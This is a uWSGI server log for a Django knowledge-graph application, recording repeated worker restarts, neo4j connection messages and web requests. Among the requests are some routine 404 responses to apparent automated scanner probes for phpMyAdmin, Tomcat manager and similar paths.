detected number of CPU cores: 1
current working directory: /root/MHKG/Django
detected binary path: /usr/local/bin/uwsgi
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
chdir() to /root/MHKG/Django
your processes number limit is 7272
your memory page size is 4096 bytes
detected max file descriptor number: 100001
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
Python main interpreter initialized at 0x1d9e1c0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
python threads support enabled
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 416880 bytes (407 KB) for 8 cores
*** Operational MODE: preforking+threaded ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x1d9e1c0 pid: 19822 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
gracefully (RE)spawned uWSGI master process (pid: 19822)
spawned uWSGI worker 1 (pid: 13545, cores: 2)
spawned uWSGI worker 2 (pid: 13546, cores: 2)
spawned uWSGI worker 3 (pid: 13547, cores: 2)
spawned uWSGI worker 4 (pid: 13548, cores: 2)
Python auto-reloader enabled
数据库已存在！
create neo4j class ...
connect succeed
数据库已存在！
[pid: 13546|app: 0|req: 1/1] 124.160.57.70 () {42 vars in 842 bytes} [Mon Apr 22 05:57:47 2019] GET /accounts/login/code.jpg => generated 1121 bytes in 1076 msecs (HTTP/1.1 404) 3 headers in 117 bytes (1 switches on core 0)
[pid: 13546|app: 0|req: 2/2] 124.160.57.70 () {42 vars in 857 bytes} [Mon Apr 22 05:57:48 2019] GET / => generated 12678 bytes in 12 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 1)
数据库已存在！
create neo4j class ...
connect succeed
数据库已存在！
273====10
{'title': '补气理气的七种家常食物', 'abstract': '很多人经常有头晕、心悸、面色苍白、易流汗的症状，这都需要补气理气。以下小编推荐补气理气的七种家常食物。', 'url': 'https://ys.99.com.cn/diaoyang/582354.htm'}
[pid: 13548|app: 0|req: 1/3] 124.160.57.70 () {44 vars in 923 bytes} [Mon Apr 22 05:57:48 2019] GET /views/console/ => generated 13408 bytes in 1376 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
[pid: 13548|app: 0|req: 2/4] 124.160.57.70 () {44 vars in 935 bytes} [Mon Apr 22 05:57:52 2019] GET /views/interlocution/ => generated 4095 bytes in 3 msecs (HTTP/1.1 200) 3 headers in 110 bytes (1 switches on core 1)
[uwsgi-python-reloader] module/file ./Django/settings.py has been modified
...gracefully killing workers...
Gracefully killing worker 1 (pid: 13545)...
Gracefully killing worker 2 (pid: 13546)...
Gracefully killing worker 3 (pid: 13547)...
Gracefully killing worker 4 (pid: 13548)...
[uwsgi-python-reloader] module/file ./Django/settings.py has been modified
worker 1 buried after 1 seconds
worker 2 buried after 1 seconds
worker 3 buried after 1 seconds
worker 4 buried after 1 seconds
binary reloading uWSGI...
chdir() to /root/MHKG/Django
closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
found fd 3 mapped to socket 0 (127.0.0.1:8000)
running /usr/local/bin/uwsgi
[uWSGI] getting INI configuration from uwsgi.ini
*** Starting uWSGI 2.0.18 (64bit) on [Mon Apr 22 05:58:06 2019] ***
compiled with version: 8.3.0 on 16 March 2019 06:35:56
os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
nodename: VM_0_13_centos
machine: x86_64
clock source: unix
pcre jit disabled
detected number of CPU cores: 1
current working directory: /root/MHKG/Django
detected binary path: /usr/local/bin/uwsgi
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
chdir() to /root/MHKG/Django
your processes number limit is 7272
your memory page size is 4096 bytes
detected max file descriptor number: 100001
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
Python main interpreter initialized at 0x25201c0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
python threads support enabled
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 416880 bytes (407 KB) for 8 cores
*** Operational MODE: preforking+threaded ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x25201c0 pid: 19822 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
gracefully (RE)spawned uWSGI master process (pid: 19822)
spawned uWSGI worker 1 (pid: 13629, cores: 2)
spawned uWSGI worker 2 (pid: 13630, cores: 2)
spawned uWSGI worker 3 (pid: 13631, cores: 2)
spawned uWSGI worker 4 (pid: 13632, cores: 2)
Python auto-reloader enabled
Mon Apr 22 06:08:22 2019 - *** /root/MHKG/Django has been touched... grace them all !!! ***
...gracefully killing workers...
Gracefully killing worker 1 (pid: 13629)...
Gracefully killing worker 2 (pid: 13630)...
Gracefully killing worker 3 (pid: 13631)...
Gracefully killing worker 4 (pid: 13632)...
worker 1 buried after 1 seconds
worker 2 buried after 1 seconds
worker 3 buried after 1 seconds
worker 4 buried after 1 seconds
binary reloading uWSGI...
chdir() to /root/MHKG/Django
closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
found fd 3 mapped to socket 0 (127.0.0.1:8000)
running /usr/local/bin/uwsgi
[uWSGI] getting INI configuration from uwsgi.ini
*** Starting uWSGI 2.0.18 (64bit) on [Mon Apr 22 06:08:23 2019] ***
compiled with version: 8.3.0 on 16 March 2019 06:35:56
os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
nodename: VM_0_13_centos
machine: x86_64
clock source: unix
pcre jit disabled
detected number of CPU cores: 1
current working directory: /root/MHKG/Django
detected binary path: /usr/local/bin/uwsgi
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
chdir() to /root/MHKG/Django
your processes number limit is 7272
your memory page size is 4096 bytes
detected max file descriptor number: 100001
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
Python main interpreter initialized at 0x137f1c0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
python threads support enabled
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 416880 bytes (407 KB) for 8 cores
*** Operational MODE: preforking+threaded ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x137f1c0 pid: 19822 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
gracefully (RE)spawned uWSGI master process (pid: 19822)
spawned uWSGI worker 1 (pid: 14686, cores: 2)
spawned uWSGI worker 2 (pid: 14687, cores: 2)
spawned uWSGI worker 3 (pid: 14688, cores: 2)
spawned uWSGI worker 4 (pid: 14689, cores: 2)
Python auto-reloader enabled
数据库已存在！
create neo4j class ...
connect succeed
数据库已存在！
[pid: 14689|app: 0|req: 1/1] 172.104.108.109 () {34 vars in 390 bytes} [Mon Apr 22 06:11:49 2019] GET / => generated 12678 bytes in 1083 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
[pid: 14689|app: 0|req: 2/2] 183.129.198.99 () {34 vars in 442 bytes} [Mon Apr 22 06:21:18 2019] GET / => generated 12678 bytes in 3 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 1)
Not Found: /index.action
[pid: 14689|app: 0|req: 3/3] 183.129.198.99 () {34 vars in 2185 bytes} [Mon Apr 22 06:21:18 2019] GET /index.action => generated 10973 bytes in 18 msecs (HTTP/1.1 404) 3 headers in 103 bytes (1 switches on core 0)
[pid: 14689|app: 0|req: 4/4] 124.41.214.42 () {32 vars in 459 bytes} [Mon Apr 22 06:25:21 2019] GET / => generated 12678 bytes in 2 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 1)
Not Found: /phpMyAdmin/scripts/setup.php
[pid: 14689|app: 0|req: 5/5] 58.251.121.184 () {38 vars in 670 bytes} [Mon Apr 22 06:28:17 2019] GET /phpMyAdmin/scripts/setup.php => generated 11021 bytes in 8 msecs (HTTP/1.1 404) 3 headers in 103 bytes (1 switches on core 0)
Not Found: /manager/html
[pid: 14689|app: 0|req: 6/6] 183.129.198.99 () {36 vars in 507 bytes} [Mon Apr 22 06:46:46 2019] GET /manager/html => generated 10973 bytes in 7 msecs (HTTP/1.1 404) 3 headers in 103 bytes (1 switches on core 1)
SIGINT/SIGQUIT received...killing workers...
worker 1 buried after 1 seconds
worker 2 buried after 1 seconds
worker 3 buried after 1 seconds
*** Starting uWSGI 2.0.18 (64bit) on [Mon Apr 22 15:19:18 2019] ***
compiled with version: 8.3.0 on 16 March 2019 06:35:56
os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
nodename: VM_0_13_centos
machine: x86_64
clock source: unix
pcre jit disabled
detected number of CPU cores: 1
current working directory: /root/MHKG/Django
writing pidfile to logs/uwsgi.pid
detected binary path: /usr/local/bin/uwsgi
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
chdir() to /root/MHKG/Django
your processes number limit is 7272
your memory page size is 4096 bytes
detected max file descriptor number: 100001
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
probably another instance of uWSGI is running on the same address (127.0.0.1:8000).
bind(): Address already in use [core/socket.c line 769]
worker 4 buried after 2 seconds
goodbye to uWSGI.
*** Starting uWSGI 2.0.18 (64bit) on [Mon Apr 22 15:19:31 2019] ***
compiled with version: 8.3.0 on 16 March 2019 06:35:56
os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
nodename: VM_0_13_centos
machine: x86_64
clock source: unix
pcre jit disabled
detected number of CPU cores: 1
current working directory: /root/MHKG/Django
writing pidfile to logs/uwsgi.pid
detected binary path: /usr/local/bin/uwsgi
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
chdir() to /root/MHKG/Django
your processes number limit is 7272
your memory page size is 4096 bytes
detected max file descriptor number: 100001
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address 127.0.0.1:8000 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
Python main interpreter initialized at 0x175b8a0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
python threads support enabled
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 416880 bytes (407 KB) for 8 cores
*** Operational MODE: preforking+threaded ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x175b8a0 pid: 21719 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI master process (pid: 21719)
spawned uWSGI worker 1 (pid: 21725, cores: 2)
spawned uWSGI worker 2 (pid: 21726, cores: 2)
spawned uWSGI worker 3 (pid: 21727, cores: 2)
spawned uWSGI worker 4 (pid: 21732, cores: 2)
Python auto-reloader enabled
数据库已存在！
create neo4j class ...
connect succeed
数据库已存在！
[pid: 21732|app: 0|req: 1/1] 180.183.250.140 () {32 vars in 455 bytes} [Mon Apr 22 07:24:09 2019] GET / => generated 12678 bytes in 2159 msecs (HTTP/1.1 200) 4 headers in 125 bytes (1 switches on core 0)
...brutally killing workers...
worker 1 buried after 2 seconds
worker 2 buried after 2 seconds
worker 3 buried after 2 seconds
worker 4 buried after 2 seconds
binary reloading uWSGI...
chdir() to /root/MHKG/Django
closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
found fd 3 mapped to socket 0 (127.0.0.1:8000)
running /usr/local/bin/uwsgi
[uWSGI] getting INI configuration from uwsgi.ini
*** Starting uWSGI 2.0.18 (64bit) on [Mon Apr 22 07:25:00 2019] ***
compiled with version: 8.3.0 on 16 March 2019 06:35:56
os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
nodename: VM_0_13_centos
machine: x86_64
clock source: unix
pcre jit disabled
detected number of CPU cores: 1
current working directory: /root/MHKG/Django
detected binary path: /usr/local/bin/uwsgi
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
chdir() to /root/MHKG/Django
your processes number limit is 7272
your memory page size is 4096 bytes
detected max file descriptor number: 100001
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
Python main interpreter initialized at 0x19bd1c0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
python threads support enabled
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 416880 bytes (407 KB) for 8 cores
*** Operational MODE: preforking+threaded ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x19bd1c0 pid: 21719 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
gracefully (RE)spawned uWSGI master process (pid: 21719)
spawned uWSGI worker 1 (pid: 22775, cores: 2)
spawned uWSGI worker 2 (pid: 22776, cores: 2)
spawned uWSGI worker 3 (pid: 22777, cores: 2)
spawned uWSGI worker 4 (pid: 22778, cores: 2)
Python auto-reloader enabled
*** Starting uWSGI 2.0.18 (64bit) on [Mon Apr 22 15:26:26 2019] ***
compiled with version: 8.3.0 on 16 March 2019 06:35:56
os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
nodename: VM_0_13_centos
machine: x86_64
clock source: unix
pcre jit disabled
detected number of CPU cores: 1
current working directory: /root/MHKG/Django
writing pidfile to logs/uwsgi.pid
detected binary path: /usr/local/bin/uwsgi
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
chdir() to /root/MHKG/Django
your processes number limit is 7272
your memory page size is 4096 bytes
detected max file descriptor number: 100001
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address 127.0.0.1:8000 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
Python main interpreter initialized at 0x1e078a0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
python threads support enabled
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 416880 bytes (407 KB) for 8 cores
*** Operational MODE: preforking+threaded ***
WSGI app 0 (mountpoint='') ready in 7 seconds on interpreter 0x1e078a0 pid: 1335 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI master process (pid: 1335)
spawned uWSGI worker 1 (pid: 1349, cores: 2)
spawned uWSGI worker 2 (pid: 1350, cores: 2)
spawned uWSGI worker 3 (pid: 1351, cores: 2)
spawned uWSGI worker 4 (pid: 1352, cores: 2)
Python auto-reloader enabled
Mon Apr 22 07:35:05 2019 - *** /root/MHKG/Django has been touched... grace them all !!! ***
...gracefully killing workers...
Gracefully killing worker 1 (pid: 1349)...
Gracefully killing worker 2 (pid: 1350)...
Gracefully killing worker 3 (pid: 1351)...
Gracefully killing worker 4 (pid: 1352)...
worker 1 buried after 1 seconds
worker 2 buried after 1 seconds
worker 3 buried after 1 seconds
worker 4 buried after 1 seconds
binary reloading uWSGI...
chdir() to /root/MHKG/Django
closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
found fd 3 mapped to socket 0 (127.0.0.1:8000)
running /usr/local/bin/uwsgi
[uWSGI] getting INI configuration from uwsgi.ini
*** Starting uWSGI 2.0.18 (64bit) on [Mon Apr 22 07:35:06 2019] ***
compiled with version: 8.3.0 on 16 March 2019 06:35:56
os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
nodename: VM_0_13_centos
machine: x86_64
clock source: unix
pcre jit disabled
detected number of CPU cores: 1
current working directory: /root/MHKG/Django
detected binary path: /usr/local/bin/uwsgi
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
chdir() to /root/MHKG/Django
your processes number limit is 7272
your memory page size is 4096 bytes
detected max file descriptor number: 100001
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
Python main interpreter initialized at 0x11fd1c0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
python threads support enabled
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 416880 bytes (407 KB) for 8 cores
*** Operational MODE: preforking+threaded ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x11fd1c0 pid: 1335 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
gracefully (RE)spawned uWSGI master process (pid: 1335)
spawned uWSGI worker 1 (pid: 2299, cores: 2)
spawned uWSGI worker 2 (pid: 2300, cores: 2)
spawned uWSGI worker 3 (pid: 2301, cores: 2)
spawned uWSGI worker 4 (pid: 2302, cores: 2)
Python auto-reloader enabled
Mon Apr 22 07:35:21 2019 - *** /root/MHKG/Django has been touched... grace them all !!! ***
...gracefully killing workers...
Gracefully killing worker 1 (pid: 2299)...
Gracefully killing worker 2 (pid: 2300)...
Gracefully killing worker 3 (pid: 2301)...
Gracefully killing worker 4 (pid: 2302)...
worker 1 buried after 1 seconds
worker 2 buried after 1 seconds
worker 3 buried after 1 seconds
worker 4 buried after 1 seconds
binary reloading uWSGI...
chdir() to /root/MHKG/Django
closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
found fd 3 mapped to socket 0 (127.0.0.1:8000)
running /usr/local/bin/uwsgi
[uWSGI] getting INI configuration from uwsgi.ini
*** Starting uWSGI 2.0.18 (64bit) on [Mon Apr 22 07:35:23 2019] ***
compiled with version: 8.3.0 on 16 March 2019 06:35:56
os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
nodename: VM_0_13_centos
machine: x86_64
clock source: unix
pcre jit disabled
detected number of CPU cores: 1
current working directory: /root/MHKG/Django
detected binary path: /usr/local/bin/uwsgi
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
chdir() to /root/MHKG/Django
your processes number limit is 7272
your memory page size is 4096 bytes
detected max file descriptor number: 100001
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
Python main interpreter initialized at 0x17ac1c0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
python threads support enabled
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 416880 bytes (407 KB) for 8 cores
*** Operational MODE: preforking+threaded ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x17ac1c0 pid: 1335 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
gracefully (RE)spawned uWSGI master process (pid: 1335)
spawned uWSGI worker 1 (pid: 2336, cores: 2)
spawned uWSGI worker 2 (pid: 2337, cores: 2)
spawned uWSGI worker 3 (pid: 2338, cores: 2)
spawned uWSGI worker 4 (pid: 2339, cores: 2)
Python auto-reloader enabled
Mon Apr 22 09:13:17 2019 - *** /root/MHKG/Django has been touched... grace them all !!! ***
...gracefully killing workers...
Gracefully killing worker 1 (pid: 2336)...
Gracefully killing worker 2 (pid: 2337)...
Gracefully killing worker 3 (pid: 2338)...
Gracefully killing worker 4 (pid: 2339)...
worker 1 buried after 1 seconds
worker 2 buried after 1 seconds
worker 3 buried after 1 seconds
worker 4 buried after 1 seconds
binary reloading uWSGI...
chdir() to /root/MHKG/Django
closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
found fd 3 mapped to socket 0 (127.0.0.1:8000)
running /usr/local/bin/uwsgi
[uWSGI] getting INI configuration from uwsgi.ini
*** Starting uWSGI 2.0.18 (64bit) on [Mon Apr 22 09:13:18 2019] ***
compiled with version: 8.3.0 on 16 March 2019 06:35:56
os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
nodename: VM_0_13_centos
machine: x86_64
clock source: unix
pcre jit disabled
detected number of CPU cores: 1
current working directory: /root/MHKG/Django
detected binary path: /usr/local/bin/uwsgi
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
chdir() to /root/MHKG/Django
your processes number limit is 7272
your memory page size is 4096 bytes
detected max file descriptor number: 100001
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
Python main interpreter initialized at 0x20db1c0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
python threads support enabled
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 416880 bytes (407 KB) for 8 cores
*** Operational MODE: preforking+threaded ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x20db1c0 pid: 1335 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
gracefully (RE)spawned uWSGI master process (pid: 1335)
spawned uWSGI worker 1 (pid: 12720, cores: 2)
spawned uWSGI worker 2 (pid: 12721, cores: 2)
spawned uWSGI worker 3 (pid: 12722, cores: 2)
spawned uWSGI worker 4 (pid: 12723, cores: 2)
Python auto-reloader enabled
Mon Apr 22 09:13:40 2019 - *** /root/MHKG/Django has been touched... grace them all !!! ***
...gracefully killing workers...
Gracefully killing worker 1 (pid: 12720)...
Gracefully killing worker 2 (pid: 12721)...
Gracefully killing worker 3 (pid: 12722)...
Gracefully killing worker 4 (pid: 12723)...
worker 1 buried after 1 seconds
worker 2 buried after 1 seconds
worker 3 buried after 1 seconds
worker 4 buried after 1 seconds
binary reloading uWSGI...
chdir() to /root/MHKG/Django
closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
found fd 3 mapped to socket 0 (127.0.0.1:8000)
running /usr/local/bin/uwsgi
[uWSGI] getting INI configuration from uwsgi.ini
*** Starting uWSGI 2.0.18 (64bit) on [Mon Apr 22 09:13:41 2019] ***
compiled with version: 8.3.0 on 16 March 2019 06:35:56
os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
nodename: VM_0_13_centos
machine: x86_64
clock source: unix
pcre jit disabled
detected number of CPU cores: 1
current working directory: /root/MHKG/Django
detected binary path: /usr/local/bin/uwsgi
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
chdir() to /root/MHKG/Django
your processes number limit is 7272
your memory page size is 4096 bytes
detected max file descriptor number: 100001
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
Python main interpreter initialized at 0x1a421c0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
python threads support enabled
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 416880 bytes (407 KB) for 8 cores
*** Operational MODE: preforking+threaded ***
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x1a421c0 pid: 1335 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
gracefully (RE)spawned uWSGI master process (pid: 1335)
spawned uWSGI worker 1 (pid: 12769, cores: 2)
spawned uWSGI worker 2 (pid: 12770, cores: 2)
spawned uWSGI worker 3 (pid: 12771, cores: 2)
spawned uWSGI worker 4 (pid: 12772, cores: 2)
Python auto-reloader enabled
数据库已存在！
create neo4j class ...
connect succeed
数据库已存在！
Not Found: /echo.php
[pid: 12772|app: 0|req: 1/1] 139.162.88.63 () {32 vars in 408 bytes} [Mon Apr 22 09:53:22 2019] GET /echo.php?info=1234567890 => generated 11092 bytes in 782 msecs (HTTP/1.1 404) 3 headers in 103 bytes (1 switches on core 0)
Mon Apr 22 09:58:38 2019 - *** /root/MHKG/Django has been touched... grace them all !!! ***
...gracefully killing workers...
Gracefully killing worker 1 (pid: 12769)...
Gracefully killing worker 2 (pid: 12770)...
Gracefully killing worker 3 (pid: 12771)...
Gracefully killing worker 4 (pid: 12772)...
worker 1 buried after 1 seconds
worker 2 buried after 1 seconds
worker 3 buried after 1 seconds
worker 4 buried after 1 seconds
binary reloading uWSGI...
chdir() to /root/MHKG/Django
closing all non-uwsgi socket fds > 2 (max_fd = 100001)...
found fd 3 mapped to socket 0 (127.0.0.1:8000)
running /usr/local/bin/uwsgi
[uWSGI] getting INI configuration from uwsgi.ini
*** Starting uWSGI 2.0.18 (64bit) on [Mon Apr 22 09:58:40 2019] ***
compiled with version: 8.3.0 on 16 March 2019 06:35:56
os: Linux-3.10.0-862.el7.x86_64 #1 SMP Fri Apr 20 16:44:24 UTC 2018
nodename: VM_0_13_centos
machine: x86_64
clock source: unix
pcre jit disabled
detected number of CPU cores: 1
current working directory: /root/MHKG/Django
detected binary path: /usr/local/bin/uwsgi
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
chdir() to /root/MHKG/Django
your processes number limit is 7272
your memory page size is 4096 bytes
detected max file descriptor number: 100001
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 inherited INET address 127.0.0.1:8000 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.7.0 (default, Mar 16 2019, 10:29:00)  [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]
Python main interpreter initialized at 0x186e1c0
